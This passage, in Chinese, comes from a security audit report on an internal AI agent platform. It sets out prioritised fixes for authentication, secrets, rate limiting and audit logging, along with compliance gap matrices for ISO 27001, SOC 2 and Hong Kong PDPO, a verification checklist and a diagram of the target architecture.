| **P0-1** | CORS/Vite 端口不匹配 | N/A (功能) | 修改 config.py + vite.config.ts | 30 分鐘 | 無 |
| **P0-2** | JWT Secret 硬編碼 | 9.1 | 環境變數 + 驗證器 | 2 小時 | 無 |
| **P0-3** | 全局 Auth Middleware | 9.8 | FastAPI middleware + 白名單 | 1 天 | P0-1, P0-2 |
| **P0-4** | Sessions 偽認證修復 | 9.1 | 整合真實 get_current_user | 1 天 | P0-3 |
| **P0-5** | HTTP Rate Limiting | 7.5 | slowapi middleware | 0.5 天 | P0-3 |
| **P1-1** | MCP Permission 運行時啟用 | 8.1 | 在 MCPProtocol 中整合 | 2-3 天 | P0-3 |
| **P1-2** | Shell 命令白名單 | 8.6 | 替換黑名單為白名單 | 1-2 天 | P1-1 |
| **P1-3** | InMemoryApprovalStorage → Redis | 7.8 | Redis 存儲實現 | 1-2 天 | 無 |
| **P1-4** | InMemoryAuditStorage → PostgreSQL | 7.5 | DB storage + migration | 3-5 天 | 無 |
| **P1-5** | LDAP 查詢結果脫敏 | 7.2 | 欄位白名單 + 脫敏 | 3-5 天 | P1-1 |

**總估算工作量**: P0 約 4 天，P1 約 12-17 天，合計 **16-21 個工作天（3-4 週）**

**備註**: 上述工作量不包含 Azure AD 整合（額外 2-3 週）、秘鑰輪換機制、或完整的安全測試套件。

---

## 十一、ISO 27001 / SOC 2 / PDPO 合規差距矩陣

### 11.1 ISO 27001:2022 差距分析

| 控制項 | 描述 | 現狀 | 差距等級 | 修復建議 |
|--------|------|------|---------|---------|
| **A.5.1** | 資訊安全政策 | 無安全政策文件 | HIGH | 制定 IPA Platform 安全政策 |
| **A.5.15** | 存取控制 | 7% 端點有認證（實際 2 個模組） | CRITICAL | 全局 Auth Middleware |
| **A.5.17** | 認證信息 | JWT Secret 硬編碼 | CRITICAL | 環境變數 + Key Vault |
| **A.5.18** | 存取權限 | RBAC 設計存在但未實施 | HIGH | 啟用 RBAC + 最小權限 |
| **A.5.23** | 雲端服務安全 | Azure 部署配置未建立 | MEDIUM | Azure 安全基線配置 |
| **A.5.34** | 個人資料保護 | LDAP 查詢無脫敏 | HIGH | 實施數據脫敏 |
| **A.8.2** | 特權存取管理 | admin/admin123 預設帳號 | HIGH | 強密碼 + MFA |
| **A.8.3** | 資訊存取限制 | MCP Permission 未啟用 | CRITICAL | 啟用 PermissionManager |
| **A.8.5** | 安全認證 | 無 MFA，弱密碼可能 | HIGH | Azure AD MFA |
| **A.8.9** | 配置管理 | 硬編碼配置，無配置管理 | MEDIUM | 環境變數 + IaC |
| **A.8.15** | 日誌記錄 | InMemoryAuditStorage | CRITICAL | PostgreSQL 持久化 |
| **A.8.16** | 監控活動 | OTel 有但 Correlation/RootCause 假數據 | HIGH | 連接真實數據源 |
| **A.8.20** | 網路安全 | CORS 過於寬鬆 | MEDIUM | 收緊 CORS + 防火牆規則 |
| **A.8.24** | 加密使用 | JWT HS256（對稱式），無 TLS 配置 | MEDIUM | RS256 + 強制 HTTPS |

### 11.2 SOC 2 Type II 差距分析

| Trust Service Criteria | 描述 | 現狀 | 差距等級 | 修復建議 |
|----------------------|------|------|---------|---------|
| **CC1.1** | 控制環境 | 無正式的安全治理結構 | HIGH | 建立安全政策框架 |
| **CC2.1** | 內部溝通 | 無安全意識培訓紀錄 | MEDIUM | 建立培訓計劃 |
| **CC3.1** | 風險評估 | RiskAssessor 存在但僅評估 Agent 操作風險 | MEDIUM | 擴展到平台自身風險 |
| **CC5.1** | 控制活動 | Auth 覆蓋率 7%，Permission 未啟用 | CRITICAL | 完善存取控制 |
| **CC6.1** | 邏輯存取控制 | 93% 端點無認證 | CRITICAL | 全局 Auth + RBAC |
| **CC6.2** | 使用者管理 | 無用戶生命週期管理 | HIGH | 用戶建立/停用/審核流程 |
| **CC6.3** | 基於角色的存取 | RBAC 代碼存在但未使用 | HIGH | 啟用 RBAC |
| **CC6.6** | 安全配置 | 硬編碼密碼、reload=True | CRITICAL | 安全配置加固 |
| **CC7.1** | 系統監控 | Patrol 有 5 種巡檢但結果 InMemory | HIGH | 持久化監控結果 |
| **CC7.2** | 異常檢測 | Correlation/RootCause 為假數據 | HIGH | 連接真實數據源 |
| **CC7.3** | 安全事件評估 | 審計記錄 InMemory，重啟即丟 | CRITICAL | PostgreSQL 持久化 |
| **CC8.1** | 變更管理 | 無正式的變更管理流程 | MEDIUM | 建立 Change Management |
| **CC9.1** | 風險緩解 | 無風險登記和處理記錄 | MEDIUM | 建立風險登記冊 |

### 11.3 香港 PDPO 差距分析

| DPP 原則 | 描述 | 現狀 | 差距等級 | 修復建議 |
|---------|------|------|---------|---------|
| **DPP1** | 目的和收集方式 | LDAP 查詢無目的聲明；Agent 可任意查詢 AD 用戶資料 | CRITICAL | LDAP 查詢需聲明目的 + 審批 |
| **DPP2** | 準確性和保存期限 | 無數據保留策略；InMemory 數據會意外丟失 | HIGH | 定義保留策略 + 定期清理 |
| **DPP3** | 使用目的 | 無限制 Agent 對個人數據的使用範圍 | HIGH | 用途限制 + 審計 |
| **DPP4** | 數據安全 | 7% Auth + InMemory 審計 + 無加密 | CRITICAL | 完善安全控制 |
| **DPP5** | 公開性 | 無隱私政策或數據處理聲明 | MEDIUM | 制定隱私政策 |
| **DPP6** | 數據存取權 | 無機制讓數據主體存取/更正自己的數據 | MEDIUM | 建立數據存取請求流程 |

### 11.4 合規差距熱力圖

```
                ISO 27001    SOC 2     PDPO
存取控制         ████████     ████████   ██████
                CRITICAL     CRITICAL   HIGH

審計日誌         ████████     ████████   ████████
                CRITICAL     CRITICAL   CRITICAL

秘鑰管理         ████████     ████████   ██████
                CRITICAL     CRITICAL   HIGH

數據保護         ██████       ██████     ████████
                HIGH         HIGH       CRITICAL

監控偵測         ██████       ██████     ████
                HIGH         HIGH       MEDIUM

配置管理         ████         ████████   ████
                MEDIUM       CRITICAL   MEDIUM

變更管理         ████         ████       ████
                MEDIUM       MEDIUM     MEDIUM

政策文件         ██████       ████       ████
                HIGH         MEDIUM     MEDIUM

████████ = CRITICAL (需立即處理)
██████   = HIGH (需計劃處理)
████     = MEDIUM (可排程處理)
```

### 11.5 合規路線圖建議

**Phase A (4 週) — 達到「可展示」安全基線**：

- 修復 P0-1 到 P0-5（全局認證、JWT、CORS、Rate Limiting）
- InMemoryApprovalStorage → Redis
- 清理 console.log
- 基本安全政策文件

**Phase B (6 週) — 達到「內部試用」合規等級**：

- Azure AD 整合
- MCP Permission 啟用
- Shell 白名單
- InMemoryAuditStorage → PostgreSQL
- LDAP 脫敏
- 基本 PDPO 合規

**Phase C (8 週) — 達到「生產部署」合規等級**：

- 完整 ISO 27001 控制項實施
- SOC 2 Type I 準備
- 安全測試套件
- 滲透測試
- 安全運維程序（Runbook）
- 事件響應計劃

---

## 附錄 A：安全驗證清單

以下清單可用於驗證安全修復的完成度：

```
P0 修復驗證:
□ 所有 API 端點返回 401 (無 Token) 或 403 (權限不足)
□ JWT Secret 不再包含預設值
□ CORS 只允許正式前端 origin
□ Sessions 端點使用真實用戶身份
□ Rate Limiting 生效（可用 curl 驗證）

P1 修復驗證:
□ MCP 工具調用需要認證 + 權限
□ Shell 只能執行白名單內的命令
□ 審批記錄在 Redis/PG 中持久化
□ 審計事件在 PostgreSQL 中持久化
□ LDAP 查詢結果已脫敏

合規驗證:
□ ISO 27001 A.5.15 存取控制 — 所有端點受保護
□ SOC 2 CC7.3 — 審計記錄可回溯至少 90 天
□ PDPO DPP4 — 個人數據存取有審計追蹤
```

---

## 附錄 B：安全架構目標狀態

```
未來安全架構（目標狀態）:

                                    Azure AD (Entra ID)
                                         │
                              ┌──────────┤
                              │  OAuth 2.0 + OIDC
                              ▼
            ┌─────────────────────────────────────┐
            │         API Gateway / WAF           │
            │  (Azure Application Gateway)        │
            │  • TLS 終止                         │
            │  • DDoS 防護                        │
            │  • Rate Limiting                    │
            │  • IP 白名單                        │
            └─────────────────┬───────────────────┘
                              │
            ┌─────────────────▼───────────────────┐
            │         FastAPI Application          │
            │  • Auth Middleware (全局)             │
            │  • RBAC (admin/operator/viewer)      │
            │  • Request/Response Logging          │
            └──┬──────────┬───────────┬───────────┘
               │          │           │
          ┌────▼───┐ ┌────▼───┐ ┌────▼────┐
          │  MCP   │ │  MAF   │ │ Claude  │
          │Security│ │ Builder│ │  SDK    │
          │ (RBAC) │ │        │ │  Hooks  │
          └────┬───┘ └────────┘ └─────────┘
               │
          ┌────▼─────────────────────────────┐
          │  Audit Trail (PostgreSQL)        │
          │  • Append-only                   │
          │  • 不可篡改 (DB Trigger)          │
          │  • 90 天保留 + 歸檔              │
          └──────────────────────────────────┘
               │
          ┌────▼─────────────────────────────┐
          │  Azure Key Vault                 │
          │  • JWT Secret                    │
          │  • API Keys                      │
          │  • DB 密碼                       │
          │  • SSH 金鑰                      │
          └──────────────────────────────────┘
```

---

*本報告基於 IPA Platform V2 分析報告的審閱及源碼級安全驗證。所有結論均附有具體的源碼位置和驗證方法。報告的目的是為 RAPO Data & AI Team 提供可操作的安全修復路線圖。*
